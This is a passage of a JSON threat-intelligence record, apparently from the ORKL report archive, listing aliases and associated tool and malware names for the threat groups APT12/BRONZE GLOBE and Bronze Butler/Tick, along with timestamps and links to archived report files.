                "Graftor",
                "HIGHTIDE",
                "IHEATE",
                "IXESHE",
                "RIPTIDE",
                "RapidStealer",
                "Specfix",
                "THREEBYTE",
                "bbsinfo",
                "mswab",
                "yayih"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e6e26922-3f4f-4243-9af5-cf9bea8b93bd",
            "created_at": "2022-10-25T16:47:55.577163Z",
            "updated_at": "2025-03-27T02:05:17.26824Z",
            "deleted_at": null,
            "main_name": "BRONZE GLOBE",
            "aliases": [
                "CTG-8223 ",
                "DNSCalc",
                "DyncCalc",
                "Numbered Panda ",
                "APT12 "
            ],
            "source_name": "Secureworks:BRONZE GLOBE",
            "tools": [
                " BeepService",
                " Etumbot",
                " Gh0st RAT",
                " Ixeshe",
                " Mswab",
                " RAdmin",
                " Seatran",
                " SvcInstaller",
                " Ziyang",
                "Badpuck"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041584,
    "ts_creation_date": 1450280217,
    "ts_modification_date": 1450280218,
    "files": {
        "pdf": "https://archive.orkl.eu/828829fcd1522aad45649b2c71a1d9050638f11f.pdf",
        "text": "https://archive.orkl.eu/828829fcd1522aad45649b2c71a1d9050638f11f.txt",
        "img": "https://archive.orkl.eu/828829fcd1522aad45649b2c71a1d9050638f11f.jpg"
    }
}